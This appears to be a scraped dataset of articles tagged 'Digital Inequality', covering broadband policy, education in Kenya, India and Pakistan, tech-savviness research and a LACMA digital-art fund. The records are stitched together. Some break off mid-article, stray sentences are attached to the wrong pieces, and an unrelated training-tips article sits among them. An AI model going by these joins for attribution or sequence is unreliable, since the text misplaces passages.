Use a “Romer” tax to cover the budget shortfall. The current political environment demands that this initiative be paid for without deficit spending. I would recommend turning to the industry that stands to benefit the most from connectivity: Big Tech. The Nobel laureate, Paul Romer, has recently suggested taxing revenues from targeted digital ads, which, in my opinion, would be an ideal revenue source. Digital ads offer large revenue pools: In 2020, social media advertising revenues were $41.5 billion, while digital video advertising revenue were $26.2 billion and advertisers were expected to spend $59.22 billion on search ads. A tax rate of, say, 19% could help close the $175 billion budget gap over eight years. The tech tax revenues could be collected in a new Universal Broadband Fund, modeled on the Universal Service Fund, by which long-distance telecoms were assessed to subsidize telephone service to high-cost areas. FCC chair Rosenworcel has said she finds such a proposal “intriguing,” but that “it’s clear that this would require action from Congress.” Maryland has already adopted the idea and other states are considering it. Coordinate locally appropriate solutions. The digital divide is an aggregate of many divides, with local barriers to be overcome. We should prioritize efforts in states where less than a third of the population has basic broadband access: Arkansas, Kentucky, Mississippi, New Mexico, Alabama, and West Virginia. We need to enable new entrants by removing bureaucratic obstacles, such as bans on municipal networks, which currently exist in 18 states. All states should have a broadband strategy. In addition, a reconsideration of the FCC’s 2017 decision to roll back net neutrality — the idea that internet service providers should not be allowed to favor or throttle service for particular forms of traffic — can help restrain broadband providers from charging more for certain services or content. A federally orchestrated approach will help ensure consistency, inclusion, and a prioritization of resources and regulatory reforms. Recruit Big Tech and internet service providers (ISPs) to help close gaps. As the government has leverage over the tech giants that are in the regulatory crosshairs — Facebook, Alphabet, Amazon, and Apple — these companies ought to be encouraged to offer favorable deals on the internet access infrastructure they own. For example, Facebook has high-capacity fiberoptic networks that can be used to provide broadband access, along with its Terragraph technology that can be used to deliver fiber-like speeds in urban settings. In parallel, major ISPs should also be made to fulfill their outstanding commitments to provide internet access. CenturyLink and Frontier Communications, for example, have taxpayer-subsidized broadband connectivity projects that need to be finished. These “low hanging fruits” should be a key part of the administration’s plan. Identify gap areas and invite public-private solutions. Given the numerous restrictions on purely public or municipal solutions, the federal government should be open to local public-private partnerships prioritizing the most vulnerable areas to accelerate the process. It can organize a bidding process to solicit solutions and get state governments involved in the process, then set targets for each state and tie subsidies, grants, and additional incentives to hit them. There is successful precedent for similar projects: Google and the state of California collaborated to connect 100,000 rural households, Microsoft and other companies worked with NGOs on a digital connectivity pilot in East Cleveland, and Facebook’s fiber network helped connect multiple educational institutions in North Carolina. Update and expand existing affordability programs. The FCC’s E-Rate program, originally designed to provide discounts to schools and libraries for telecoms access, should be expanded to include households with schoolchildren in broadband deserts. Then there’s the federal Lifeline program, designed to provide subsidies for telephone and internet services to eligible low-income households. However, the service quality was so poor that only 25% of those eligible took advantage of it. This situation can be improved by providing further funding for Lifeline and offering a wider set of better connectivity plans to users. Build in future-proofing. The standards for broadband need to be raised in order to accommodate the increased demands on internet ecosystems down the road. A bipartisan group of four U.S. senators have even sent a letter to the FCC, the U.S. Commerce Department, and the Department of Agriculture, urging raising the federal broadband standard to 100 Mbps in keeping with these growing needs. Resistance from cable and telecom companies about such a change in standards needs to be anticipated and managed. (These companies worry that they would be excluded from government grants and subsidies and that competitors backed by public subsidies would have an unfair advantage.) Also, future-proofing should integrate a federal “Dig Once” mandate that would require the simultaneous construction of broadband infrastructure alongside other unrelated construction projects, wherever feasible. Such a policy could save considerably on construction costs and allow simultaneous construction of broadband infrastructure alongside other infrastructure projects. Invest in digital literacy. Only 40% of American adults can answer basic questions on topics including phishing, privacy, and cookies. Digital literacy is key to improving adoption, combating misinformation and scams, and limiting the risks of cyber-attacks. Public and private-sector initiatives can build on the foundations set by the Accessible and Affordable Internet for All Act that puts aside $60 million in grants to states seeking to bolster digital literacy programs. Lifelong digital proficiency programs — beginning at a young age in the broader education system and continuing through later adulthood on the job — can offer Americans a source of resilience against these threats and make them better consumers of the digital ecosystems. More resources for “digital inclusion funds” and “digital navigators” that already help low-income households and older adults in the use of technology in many cities ought to be scaled-up nationwide

Bridging of the digital divide is both complex and daunting, but there are reasons for hope. Many institutions — both public and private — stand to gain from it being addressed. The pandemic experience is a reminder of the very real costs of the digital divide that have added up over the years: Schoolchildren without internet access fell behind. Residents of internet deserts missed vaccine appointments snapped up by internet-enabled non-residents. Disadvantaged minority populations felt the pinch of inadequate high-speed internet access as jobs and job searches went remote. We now have a rare bipartisan agreement on the urgency of solving the problem. Let’s act on it.

Before the pandemic, the government embarked on ambitious reforms which sought to improve the quality of education through several approaches; a competency-based curriculum (CBC), reforming professional teacher development, textbook policy, and management practices at the local level.

These reforms have made Kenya a top education performer in Eastern and Southern Africa, according to the Kenya Economic Update, Edition 25: Aiming High, Securing Education to Sustain Recovery. The report outlines the key messages from the new World Bank Public Expenditure Review (PER) in basic education and highlights Kenya’s impressive achievements, challenges, and the way forward.

The report notes that Kenya’s real gross domestic product (GDP) is projected to grow by 5.5% in 2022 and 5.2% on average in 2023–24, a moderation following a remarkable recovery in 2021 from the worst economic effects of the pandemic. Education will need additional resources from this economic growth even while the country continues to recover from COVID-19, reduce inequities and expand the system and implement ambitious in a context of fiscal consolidation.

“Learning remains one of the most critical assets for any country to promote equitable growth and poverty reduction, and that cannot happen without a solid foundation,” said Pedro Cerdan-Infantes, World Bank Senior Economist. “While the Education sector faces treacherous sources of inequality including uneven quality and results, Kenya has embarked on ambitious reforms to address the quality issues rather than considering the job done by virtue of near-universal access and coverage.”

Kenya’s education sector is recovering from the COVID-19 crisis after years of impressive improvements in outcomes, while implementing ambitious reforms that started before the pandemic.

Top education performer in Eastern and Southern Africa

Primary education is reaching universal levels while secondary school enrolment increased by over 50% in the seven years before the pandemic. These achievements have resulted directly from increased spending and enrolment at all levels, as well as consistent improvements in learning outcomes before the pandemic.

Performance also improved in numeracy (mathematics) and languages (English and Kiswahili). For example, performance in Class Three mathematics, English and Kiswahili improved in 2016 and 2018. Minimum requirement satisfaction increased by 6% in numeracy,16% in English, and 6% in Kiswahili. Regionally, Kenya is outstanding in reading, the report notes. Numeracy dropped in 2018 against neighboring countries, however, early grade mathematics assessments between 2015 and 2021 improved from 71% in 2016, to 80% in 2021 in secondary schools. Final secondary examinations (KCSE) performance improved from 11% in 2017 to 18% in 2021.

According to the report, these improvements resulted from sustained high spending on education. Expenditure has reached international benchmarks, both as a share of total government expenditure (TGE) and as a share of gross domestic product (GDP). TGE as a share of GDP reached 5.3% in 2018, higher than the average for other lower middle-income and upper middle-income countries, except for South Africa. The share of the government budget on education also increased, reaching 19% in 2020. Education spending per capita is also relatively high compared to countries in the region, which the report highlights is a key factor in quality education.

Despite these gains, challenges abound. Kenya has huge regional inequalities in all education outcomes. While most counties exceed 12 expected years of school, very low outcomes are concentrated in a few counties in the north and northeast of the country, in arid and semi-arid areas with EYS as low as 6.5 years. Only Nairobi County is near completing 12 years of Learning Adjusted Years of School (LAYS).

Education outcomes are much lower in rural areas and for lower income populations. Net enrollement rates (NER) are significantly higher in pre-primary, primary and secondary education, for children from households in the top 20% of income distribution, when compared to the bottom 20%.

Compounded by the pandemic, these challenges have led to learning losses and deepened inequalities in education. Around 17 million students and more than 320,000 teachers were affected by the closure of 30,000 primary and secondary schools in 2020. Schools gradually reopened from October 2020 to January 2021. Efforts to provide remote learning revealed a significant digital divide, with over 50% of the students being left out, mainly due to lack of appropriate electronic devices, access to electricity and internet connectivity.

The report proposes several policy recommendations centred on adequacy, equity and efficiency in resource use as the school system prepares to expand to accommodate more students, especially in pre-k and post-primary education. Continued and accelerated improvements in the sector will depend on:",Digital Inequality,2022-06-07 07:38:52

It is leading socio-economic transformation at grass-root levels, bringing efficiency and accountability, creating new income opportunities, increasing connectivity and driving economic growth. While these developments show the tremendous potential of digital transformation, the recent pandemic has also accentuated the gaps between the haves and the have-nots.

These digital divides have left very large numbers behind in the COVID-induced digital acceleration.

The Indian experience of digitalisation has been truly unique with its own set of challenges. Internet penetration has increased in the past few years. The COVID-19 pandemic further strengthened the pace at which people are opting for digital methods in their daily lives. Almost all the e-commerce marketplace platforms noted an uptick in the seller count.

The number of sellers on Government eMarketplace (GeM) for Micro, Small, and Medium Enterprises (MSMEs) recorded a jump from 3,76,000 sellers in 2020 to 1.78 million in 2021. About 28% of MSMEs saw their digital sales double, while another 23% saw an increase of 50%-100% in one year through digital channels.

What of women?

Digitalisation has largely made the life of a common man easier in India and unlocked new opportunities for him. But the same is not true for the ‘common woman’. The pandemic has further deepened gender inequality. As education compulsorily shifted online in the pandemic, female students suffered a greater brunt with comparably lower access to digital networks than male students, due to varying family attitudes and biases.

It has been reported that only 35% of Indian women have internet access. Up to ten million girls are in danger of dropping out of schools, that could result in early marriages or child labour. Education is the only social security for most girls.

The Indian economy is also bound in the matrix of extreme poverty along with extreme wealth. While India produced 40 more billionaires in the last year, more than 46 million persons slipped into poverty. Income inequality is increasing rapidly and since the accessibility to digital services is still largely restricted to the privileged classes; digitalisation is entrenching poverty instead of reducing it.

As only 3% of India’s poorest 20% households have access to a computer, and 9% have internet connectivity, the difficulties faced by the poor in gaining any benefits emanating from digital infrastructure have only increased multifold.

Rural population is still unserved or under-served, creating another layer of digital divide. Due to unreliable electricity, unaffordability, topographical challenges, and the high cost of infrastructure, rural India faces challenges in even securing access to functional internet. The lack of sufficient content in the local language is another barrier for a very large population that is not well-versed in English.

The lack of access to the internet also translates to low digital literacy in India. As per a study, only 20% of Indians have the technical know-how to fully use digital services. In 2016, digital literacy was as low as just 10%, impeding the implementation of welfare schemes in the country.

Digital illiteracy in a highly digital world exposes the population to security and privacy lapses. The Personal Data Protection Bill, (PDP Bill) 2019 has been pending in the Parliament for more than two years.

Also read: Health IDs: Unpacking the Narrative That Underpins India’s New Digital Superstructure

In the absence of a regulatory framework, issues like privacy infringement, illegal storage of data, and absence of consent arise.

For example, National Digital Health Mission aims to create unique Health IDs of the individuals to facilitate a seamless flow of patients’ medical information across multiple systems. This Health ID was recently integrated with the vaccination appointment slot portal (CoWIN) to maintain a database of the vaccinated population in India. However, no consent was sought and no prior information regarding its use was provided. Without a legislative framework, it is generally feared that data security and safety could be compromised.

As in all public policy, the touchstone of legitimacy must come from the Gandhian principle of helping the poorest: “The true measure of a digitally inclusive infrastructure can be found in how it would treat the most vulnerable members of society”.

The government needs to start at the grassroots to increase the access and affordability of digital services, through PPP where feasible, to ensure reliable internet services even in the remote corners. While the internet holds the key to unlocking the next phase of the economy, many people might not get a chance to participate in it if they are not properly trained and inducted. Social stigmas need to be eradicated around the use of internet to onboard the female population.

The much-delayed PDP bill has also attracted heavy criticism from sectoral experts. It may have aimed to increase the cybersecurity in India but it would result in a higher compliance burden for the e-commerce companies, it is feared.

Therefore, the legislation should aim to optimise regulations to promote good governance in the digital space.

In developing countries like Pakistan, women, the elderly, the disabled and other vulnerable groups are the least likely to benefit from the digitalization of financial services.

But by leveraging existing technologies in innovative ways, states can create a technological ecosystem that enfranchises them into the financial system.

It will be impossible to close the growing gap between the haves and have-nots of the world without a concerted effort to improve financial inclusion for the most vulnerable.

The differences between those who benefit from the banking and financial systems and those who do not are particularly acute.

For countries in the developing world, the inequality between the winners and losers of digitization is particularly stark — and, if left unaddressed, could become more entrenched over time.

The lives of the disenfranchised must be brought into the financial comfort zone through access to services, products, and commodities currently available only to a limited number of citizens of nations with widespread digital capacity.

The foundations of financial inclusion

To improve financial inclusion, countries must introduce one or more of the following three foundations of a financial ecosystem: a national identification system to identify and register individuals and households of low-income groups; financial access facilitated by the opening of bank accounts with ease, particularly for groups with lower literacy levels and a network of infrastructure in the country, telecom penetration and digital access on a wide geographic basis.

In 2019, according to ITU’s 2020, “Measuring digital development report"", about 3.7 billion people globally were unable to access the internet. In the Least Developed Countries, 17% of the rural population had no mobile coverage, while 19% of the rural population was covered by only a 2G network — incapable of carrying the volumes of data required for advanced internet services.

A financial inclusion ecosystem

Digital transformation has the capacity to revolutionize how people with less formal education or lower incomes interact with the banking system — if it is done right.

As it stands, in some countries, filling out banking applications can be a bureaucratic nightmare, and banks may be less than helpful if they see little chance of a customer reaping them financial rewards down the line.

But digital banking makes it seamless for a telecoms subscriber to open a bank account on the “many-to-many” concept, by providing national identity credentials.

With end-to-end integration with all telecom operators and financial institutions, a centralized data and credit history of citizens helps financial institutions offer other financial products. This makes it even more convenient to undertake banking transactions.

Agent interoperability can also be a catalyst for financial inclusion, as it plays a critical role in helping government organizations to implement social welfare and relief programs, issue loans and provide digital insurance to the population.

To overcome the challenge of bureaucratic delays, governments must incentivize the private sector to invest in fintech, IT and telecoms infrastructure to render digital financial services for poverty alleviation at an affordable cost.

ITU’s 2020 report noted that “increasing digital transformation is amplifying these existing socioeconomic inequalities. The risk is particularly high for women and girls, youth, persons with disabilities, older persons, and people living in remote areas.”

As the world goes digital, the most vulnerable sections of the population are in danger of being all but left behind.

Pakistan's approach

To mitigate this, existing technologies can be leveraged in innovative ways to enhance financial inclusion.

For example, using USSD (Unstructured Supplementary Service Data) technology — similar to SMS texting — Pakistan's Asaan Mobile Account (AMA) scheme connects subscribers of any major telecoms network to a panel of financial institutions. From there, they can open a bank account in less than one minute.

Asaan translates to “easy” in Urdu, and that is the point of the scheme — a simple technology that allows the financially excluded to enfranchise themselves into the basics of a digitized financial system.

It is a key part of Pakistan’s mission to have half the country’s population financially enfranchised by 2024.

In just six months since its launch, the AMA scheme has led to the creation of four million new bank accounts, the processing of 29 million transactions worth over $140bn.

And, critically, 31% of accounts created using the AMA scheme were made by women, compared with 18% of standard bank accounts in Pakistan.

An operating model to replicate

Pakistan’s model is simple enough to be replicated in developing countries that lack either the requisite banking and telecom policies but can establish the ID system necessary to put it all together.

By ensuring a smooth, simple and effective payment system for the underprivileged, vulnerable and poor, the one-stop business model operating in Pakistan can be easily adjusted to suit other developing countries. And it can do this while still being customizable depending on differing requirements — not only for the poor but also for the female population.

Bridging the digital divide must be a well-coordinated programme tailored to each individual country.

Presently, many of the most vulnerable people in developing countries are out in the ""financial cold"" and in danger of being left permanently behind. Replicating Pakistan’s efforts could be a game-changer for millions of less fortunate citizens in the developing world.",Digital Inequality,2022-05-19 07:00:00

Cassidy Puckett, a sociologist in Emory College of Arts and Sciences, argues the problem lies not just in lack of role models, access or opportunities. In her new book, “Redefining Geek,” she shows that tech-savviness comes from five core habits that help tech-savvy people build their skills but they are not equally identified, developed and rewarded.

“For all of the talk of the digital divide and how girls are scared of tech or poor kids don’t have access, my research points to a bigger problem of not recognizing people’s talents,” Puckett says. “The good news is, these talents relate to underlying habits that are the foundation of being good with technology. We can intervene and encourage the habits, but they need to be recognized and rewarded more equitably.”

Three of the habits Puckett identified in her research apply to general learning: being willing to try and fail, coping with frustration and boredom and being able to use models such as people or information.

The other two are more tech-centric: having the ability to use design logic by thinking about why tech is made a certain way, and being able to identify efficiencies, essentially finding shortcuts and hacks.

Recognizing these habits lets educators observe them in students, intervene where needed and provide more advanced opportunities for those who are ready for them.

Puckett developed a 15-question survey for students to answer to help determine where they are regarding those habits. She then examined differences among groups for the resulting measure, which she calls the Digital Adaptability Scale.

Her findings show that girls use the tech-specific skills less than boys do, suggesting a type of gatekeeping from peers, educators and family who aren’t sharing the insider tricks and knowledge that help the tech-savvy learn.

There were not, however, similar differences when Puckett examined race, ethnicity and class, indicating that those marginalized groups are unrecognized and unrewarded for their technological talents. That, in turn, perpetuates stereotypes about students’ capabilities that can affect course offerings and structures that reinforce incorrect assumptions.

Real-time applications of findings

Gwinnett County School District administrators and teachers have seen firsthand how tech- savviness can be developed in students. They are debating ways to apply Puckett’s research and intervention ideas to build those habits in all students in an artificial intelligence (AI)-themed cluster of schools set to open this fall.

“Every student needs to swim in the technologically advanced future,” says Babak Mostaghimi, Gwinnett’s assistant superintendent for curriculum, instructional support and innovation. “While some may just wade into the waters, we know that most kids will need to get to the snorkeling level. And, there will be some of our students who will naturally want to become scuba divers, using their passion for AI and technology to go deep into these areas.

“The neat part is that by focusing on and building habits, we can help all of our students develop the foundation and the tech-savviness they will need to be a scuba diver,” Mostaghimi adds.

Real-world experience informs research

Puckett’s role in flipping the narrative of who is tech-savvy — the “geek” in her book title — has been years in the making. Her low-income high school’s tech education was limited to teaching how to type on electric typewriters, given a shortage of available computers.

Her interest expanded in college, though. Her move to the San Francisco Bay area for an AmeriCorps job coincided with the region’s boom and bust as the country’s tech hub.

Puckett’s decision to share the tech skills she was learning by teaching technology classes at a low-income Oakland middle school became the seed of her book. She earned a master’s degree in education in learning, design and technology from Stanford University in hopes of applying theories to design her classes. She quickly discovered there was no standard for how to evaluate the tech learning process.

She took those experiences, and four years working at an educational research company, to her doctoral project on digital adaptability and social inequality. Part of that work included observing teens who were expert tech learners, to see what had helped them.

Puckett later built and refined the Digital Adaptability Scale by turning those observations into lists of habits that she again ran by teens. The goal was to get a manageable list — she settled on questions around the five habits — that would be practical in classrooms.

She plans to continue her research, including discussing her techniques in undergraduate classes and working with school districts to apply the lessons from her research to stay on top of technology as an ever-changing part of our landscape.

“Can we please dispel the idea of who is and who isn’t good at technology?” Puckett asks.“We can use the survey to help dispel that myth, understand who needs help and who is ready for new challenges, and help create a more equitable technological future.”",Digital Inequality,2022-04-13 07:00:00

High-speed internet at home is a necessity for American families. Without it, kids can’t attend virtual classes or complete homework at home, and families can miss out on critical healthcare or government services.

However, 28.2 million U.S. households lack what has become a basic need, according to a new report by EducationSuperHighway, an education nonprofit that in 2019 helped to almost eliminate the internet connectivity gap in classrooms across the country.

Last year, as reported by The Hechinger Report’s Tara García Mathewson, the nonprofit group pivoted to solving the homework gap.

Evan Marwell, founder and CEO of EducationSuperHighway, said his team “learned a tremendous amount” during their research on the new report about the reasons 28 million households are still not connected to high-speed internet.

Most of these households, he said, “have infrastructure available at their home but they just can’t afford to sign up for a broadband service.” Only a third of those without broadband access blame a lack of infrastructure; the remaining two thirds without access say they can’t afford it, Marwell said.

In 43 states, that affordability gap accounts for the largest share of the digital divide, according to the EducationSuperHighway report. Issues around broadband affordability disproportionately affect low-income, Black, and Latinx communities. The nonprofit is launching EducationSuperHighway 2.0 to tackle the broadband affordability gap.

The announcement of the new program came with the release of the nonprofit’s report, “No home left offline” which breaks down the broadband affordability gap across the country and outlines key recommendations for policymakers, internet service providers and school districts.

“Policymakers have been talking about the digital divide for decades, but we’ve been closing it at a pace of about 1 percent a year,” Marwell said. “The pandemic really changed the political will. We’ve seen the federal government step up and say, ‘You know what, we need to pay for that.’”

The federal American Rescue Plan Act, passed last spring, and the recently approved infrastructure bill could add as much as $85 billion in federal funding for broadband infrastructure, affordability and broadband adoption programs, according to the report.

Marwell argues that the broadband affordability gap is a solvable problem, one that can be fixed with money and effort. Under the bipartisan infrastructure bill, money will be provided: Funding for the federal Emergency Broadband Benefit Program — to be renamed the Affordable Connectivity Program — will increase by $14.2 billion to help households afford a broadband connection.

The next challenge, however, is to get people to sign up. About 16.4 percent of eligible Americans were enrolled in the federal EBB initiative as of October 2021. Marwell said his organization plans to launch a broadband adoption center program to help families enroll for the federal programs and get home broadband service.

In the meantime, EducationSuperHighway is trying to tackle other barriers through efforts that include building stronger public-private partnerships at the state and local levels, identifying students who lack a broadband connection and setting up free Wi-Fi for low-income apartment buildings.

Pilot initiatives are already in the works. Last year, for example, the group partnered with the city of Oakland, California to install free Wi-Fi networks in five apartment buildings.

Marwell said states and districts must seize this “moment of opportunity,” as they prepare to receive federal dollars, to help bridge the broadband affordability gap.

“We need to act because if we can’t make real progress against the digital divide, today, and in this environment, I don’t know when we ever are,” Marwell said. “There will never be more of a sense of urgency around it than there is today.”

By Gerhard Hartman, Vice President: Medium Business, Sage Africa & Middle East

A highly motivated and skilled workforce is an asset to any company, but building your team's capabilities and competencies takes time and investment. However, in these volatile times, many companies have had to reduce their training budgets, along with other steps taken to cut costs. This means getting a great return on investment (ROI) from your training spend is more important than ever.

A flexible approach to nurturing talent is key to creating an inclusive Future of Work within your business. Upskilling and reskilling your people is all about knocking down barriers so that everyone can thrive during these times of flexible work and job sharing. Here are some tips to ensure your training delivers bang for your buck:

Create and reuse your own resources

Bringing in external training consultants can be expensive. Consider creating your own internal modules for basic training in company policy, processes, and systems.

Embrace functional training

One of the best ways of nurturing talent is to tailor training to relate specifically to your team's key performance requirements. From here, you can determine the best way to upskill or reskill employees, whether that's mentoring and coaching from a manager or external multi-week skills development courses to improve technical knowledge.

Take advantage of your subject matter experts

Your business may have managers or technical experts with deep knowledge and experience to share with your team. Encourage them to share their knowledge through coaching sessions, webinars or on-the-job training. This is an inexpensive way to conduct training and boost your team's drive and self-confidence.

Put technology to work

In this era of flexible work, your employees have become accustomed to working, collaborating and learning online. In this context, digital learning is a great way to maximise your training budget. Online courses range from formal certifications from local and international institutions to short and affordable courses on platforms like Udemy and LinkedIn Learning to free and high-quality online courses from the likes of Coursera and even some great content on YouTube.

Get employees aligned with the need for ROI

Be clear with your team on what you expect to deliver with training and what you expect from them afterwards. Behavioural objectives should clearly outline what they should know or do by the end of the programme.

Mix it up with multiple approaches

Keeping employees engaged and motivated is essential to driving real value from learning and development initiatives. Mix things up to cater for different learning styles and keep things fresh for your team:

On-the-job training: training provided to colleagues within the daily work environment.

Off-the-job training: training provided away from the workplace, generally used in cases where upskilling is required and includes workshops, seminars, and conferences. This is more costly, and effective only if many employees have to be trained within a short timeframe.

Active learning: trainees play a leading role in learning by exploring issues and situational problems under the guidance of their facilitator. The trainees learn by asking thought-provoking questions, searching for answers, and interpreting various observations made during the process.

Enlist employees to help

Identify members of your team who are passionate about training and recording processes, procedures and other business-critical information. Encourage them to create manuals and handbooks to instruct and guide new and existing team members on technical procedures and corporate policies. You can also ask those who have taken a recent course or attended seminars to share their insights with others.

In closing

Training doesn't have to be time-consuming and expensive. Consider how you can upskill your team to enhance their performance during tough economic times and an age of flexible work. A good training strategy will help harmonise your skills base, thus ensuring your employees feel empowered to work on their own without constant help and supervision from others.

SMB's in the region strive to become innovative, people companies by transforming how they acquire, engage and manage their people. As your business grows, it is important to keep that entrepreneurial spirit alive, focusing on maintaining productivity, motivation and wellbeing in the workforce to ensure business success.

So, we must also call upon the tech industry to invest much more in such initiatives, here and everywhere.","The following essay was originally published in The Philadelphia Inquirer in collaboration with Drexel University’s Lindy Institute for Urban Innovation as part of Rebuilding Philly, a series of commentary articles written by Drexel faculty and professional staff related to the COVID-19 pandemic and racial and economic equity gaps in Philadelphia. It was written by Youngmoo Kim, PhD, director of the Expressive and Creative Interaction Technologies Center and professor of electrical and computer engineering in the College of Engineering.

The sudden transition to remote learning due to the pandemic brought long-overdue attention to the digital divide, particularly the number of families without home broadband internet. In Philadelphia, the phrase “Parking Lot WiFi” justly attained infamy. In 2020, the city and School District, with industry and philanthropic partners, launched PHLConnectED to assist up to 35,000 students without home broadband internet service. The city’s just-published “Connecting Philadelphia” survey shows an increase in home broadband from 70% (in 2019) to 84% (2021).

While I applaud these initiatives and related efforts to provide computers and connectivity to all, it’s not nearly enough — and it doesn’t get to the heart of the problem.

Put another way, back in 2001, if you’d told me (or most anyone in tech), “in 20 years, 92% of American adults under 50 will have a pocket supercomputer with always-on wireless internet access,” we’d have celebrated the closing of the digital divide. But this betrays an antiquated view, focusing on devices and technology rather than education and training.

Closing the divide was supposed to create more equitable economic opportunity, but we are no closer to digital equity than we were in 2001. The huge gains in tech over the past 20 years are further fueling economic inequality, catering to those with means while leaving behind those who lack socioeconomic privilege, particularly people of color. Devices and connectivity are not enough to achieve digital inclusion.

The nonprofit National Digital Inclusion Alliance recently released its 2021-2022 “Policy Priorities,” emphasizing both universal broadband access and digital literacy and skills training. The former has received significant attention through temporary internet assistance programs, like the Emergency Broadband Benefit and PHLConnectED. These are having an impact, but making the broadband benefit program permanent would ensure a true home broadband safety net.

The call for investment in community-based digital inclusion and skills programs deserves greater attention. The inclusion alliance advocates for supporting trusted, locally grown initiatives working directly with neighborhoods and families to address actual needs (not the assumed needs imagined by industry or education technology providers). A local example is the Digital Navigator program, started by the city and the Digital Literacy Alliance, a network of community sites — including a program that I lead at Drexel University — which provides call-in helplines to assist those who need devices and training. The Technology Learning Collaborative is another Philadelphia-based organization spearheading local digital inclusion efforts into collective action.

Here’s why I hope all Philadelphians become familiar with these efforts: The Digital Equity Act, part of the bipartisan infrastructure bill awaiting passage, proposes $2.5 billion for new digital inclusion and skills training initiatives over five years.

It will be crucial for state and local governments to distribute these funds to trusted community-based initiatives experienced in digital inclusion (not just traditional tech training programs, which are historically exclusive). Short-term needs must be addressed for digitally marginalized groups (the poor and elderly), and some support should focus on high-quality out-of-school digital enrichment programs for young students, absent in many parts of our city.

It is also absolutely critical to invest in longer-term digital skills development through public education to make substantive gains toward digital equity. This requires partnership, and the city, the School District, the Digital Literacy Alliance, the Technology Learning Collaborative, and others are already working together. By coordinating these efforts with increased industry support, Philadelphia could become a model city for digital equity.

So, we must also call upon the tech industry to invest much more in such initiatives, here and everywhere. Tech companies have nodded collectively in the direction of diversity and inclusion, but efforts to date are but a drop in their ocean of profits. It’s been said that “data is the oil of the 21st century.” The tech industry, built upon our data, has reaped enormous profits that are being enjoyed by only a select few, much like the oil barons of the late 19th and early 20th centuries. Whether we realize it or not, we are living in a similarly gilded age, but this time technology is the driver. The solution is not to give everyone a bit of oil, but to invest in training and education to provide greater opportunity to ensure a more equitable future — digitally and otherwise.",Digital Inequality,2021-11-04 07:00:00

The Baltimore Museum of Art, for one, pledged to acquire only work by women artists in 2020, earmarking $2.5m for purchases.","The Los Angeles County Museum of Art (Lacma) has launched a new acquisition fund for digital art by women artists, established by the heiress and celebrity Paris Hilton. The museum declined to share how much it had received from Hilton but said that the gift is the institution’s first of its kind for digital art. It also marks the first acquisition fund that the former The Simple Life reality TV star has set up for an art museum.

Lacma has a robust collection of digital art, with artists such as Tony Oursler, Petra Cortright and Ryan Trecartin represented in its holdings. The new fund represents the museum’s acknowledgment of the current levels of innovation around art and technology, according to Dhyandra Lawson, assistant curator in Lacma’s photography department.

“This is an extremely fertile period for digital art,” Lawson says. “We’re just seeing tons of innovation by artists in a variety of media. [The fund] will really help us augment and expand our collection in important ways.”

Lacma’s investment in art and technology dates at least to 1967, when it established its Art and Technology program that generated collaborations between artists and technology corporations. Although that initiative ended in 1971, it was reborn in 2013 as the Art + Technology Lab . The museum has also been collecting digital art for decades, with a large portion of these works dating to the 1990s. The fund provides an opportunity to address historical gaps.

“Certainly we can go earlier, particularly with women artists, but we also want to be responsive to what artists are doing now with a variety of new media,” Lawson says. “As our lives are being increasingly digitised, it’s important to pay attention to what digital artists are saying, and particularly digital artists who have been historically on the margins.”

The museum has already commissioned and acquired one video work with the new fund. The Question (2022), by British artist Shantell Martin, “uses digital technologies to engage drawing”, according to a press release. Lacma also announced its acquisition of Continuum: Los Angeles (2022), a 40-minute video received as a gift by its artist, Krista Kim, who is Canadian Korean. Both works were delivered as NFTs (non-fungible tokens). They will be included in an exhibition examining digital innovation by women artists scheduled to open this fall at Arizona State University.

The acquisition fund is in many ways an unsurprising move for Hilton, who has become one of the most high-profile proponents of NFTs. The proto-influencer, entrepreneur and DJ has invested in cryptocurrency since 2016 and has proclaimed herself “Queen of the Metaverse”. The buyer of a Bored Ape Yacht Club NFT, Hilton has also invested in Mad Realities, a company that aspires to be the “Web3 version of Netflix”, and the NFT platform Origin Protocol, where she dropped her second NFT collection in February. On National Pet Day last year, she introduced her new dogs, christened Crypto Hilton and Ether Reum—the latter a double entendre for the NFT market’s currency of choice, Ethereum, and her husband Carter Reum.

Reum, a venture capitalist, has been a member of Lacma’s board since 2017. The acquisition fund emerged organically through that relationship, according to Lawson. “We just kind of realised that we had a mutual interest,” she says. Although the fund’s patron has been most vocal about NFTs, Lawson emphasises that the money will be used to buy a wide range of artwork. “The acquisition fund is for digital art,” she says. “It’s not an NFT fund.”

The fund’s focus on women artists reflects a steady trend in the museum world to address gender inequality in institutional collections. The Baltimore Museum of Art, for one, pledged to acquire only work by women artists in 2020, earmarking $2.5m for purchases. But considering the price of artworks and the historical bias of buying art by men, achieving gender parity will be a challenge for many institutions. A 2019 study by Artnet News and In Other Words found that among 26 museums in the US, just 11% of acquisitions between 2008 and 2018 were of works by women artists.",Digital Inequality,2022-06-10 21:57:15

Yet we hardly see any significant joint efforts between the U.S. and China to help combat digital divides in the least developed countries. This article originally appeared in ThinkChina .

The COVID-19 crisis has interrupted daily life and business routines across the world, caused a massive loss of millions of lives, and exacerbated economic disparities within and between countries. COVID-19 has also revealed fundamental challenges in the international order. As Kissinger has asserted, “the world will never be the same after the coronavirus.” One can reasonably expect that cynicism regarding regional and global integration, as well as radical populism, racism, ultra-nationalism and xenophobia, will likely continue to rise around the world.

At this critical juncture, it has become even more essential to examine the urgent challenges that the world confronts and to engage in global cooperation instead of devolving into constant contention and confrontation. One of the most urgent tasks for the international community is to overcome growing digital divides.

Digital divides in least developed countries (LDCs) have been particularly salient, as digitally disconnected populations have been left further behind during the pandemic. The U.S. and China, two superpowers in the digital era, should work in tandem with the international community to jointly combat digital divides and COVID-19.

The expansion of digital divides in LDCs

Despite the global growth of digital technologies, a 2021 United Nations report noted that nearly half of the world’s population, 3.7 billion people, lack internet access. Deficiency of digital connectivity is especially prevalent within LDCs, where more than 80% of the population are still offline. In comparison, the unconnected population in developed countries and developing countries stands at 13% and 53%, respectively.

LDCs account for about 14% of the world’s population, and they comprise more than half of the world’s extremely poor. Digital divides both reflect and reinforce socioeconomic disparities. The pandemic has aggravated existing inequalities, often resulting in a widening gap of digital skills.

As a result of COVID-19-induced economic difficulties, the population of extreme poor in LDCs expanded by 32 million, and the number of people in poverty in LDCs grew to 36% in 2020, 3% more than in prior years. More specifically, LDCs lag further behind in the following three areas.

Digital economy

In 2018, prior to the COVID-19 crisis, over 70% of the population in developed countries purchased goods and services online while only 2% in LDCs did the same. The digital divide deprives workers and consumers in LDCs of the opportunity to benefit from e-commerce on both the supply and demand ends.

Public health and vaccine distribution

